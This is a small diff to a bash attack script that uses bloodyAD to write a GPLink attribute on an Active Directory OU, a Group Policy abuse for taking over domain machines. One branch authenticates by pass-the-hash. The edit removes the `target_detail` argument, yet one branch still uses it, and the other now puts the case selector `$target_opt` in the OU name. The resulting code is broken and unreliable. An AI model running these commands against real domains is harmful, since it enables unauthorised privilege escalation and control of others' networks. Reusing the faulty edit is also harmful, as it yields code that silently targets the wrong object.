@@ -1,7 +1,6 @@
 #!/bin/bash
 
 target_opt="$1"
-target_detail="$2"
 domain="$3"
 user="$4"
 password="$5"
@@ -29,7 +28,7 @@ case "$target_opt" in
       # Pass the Hash
       bloodyAD -d $domain --host $target_ip -u $user -p aad3b435b51404eeaad3b435b51404ee:$password set object "OU=$target_detail,DC=$domain_prefix,DC=$domain_suffix" GPLink -v "[LDAP://$gpo_ldap_query;0]"
     else
-      bloodyAD -d $domain --host $target_ip -u $user -p $password set object "OU=$target_detail,DC=$domain_prefix,DC=$domain_suffix" GPLink -v "[LDAP://$gpo_ldap_query;0]"
+      bloodyAD -d $domain --host $target_ip -u $user -p $password set object "OU=$target_opt,DC=$domain_prefix,DC=$domain_suffix" GPLink -v "[LDAP://$gpo_ldap_query;0]"
     fi
     ;;
 esac
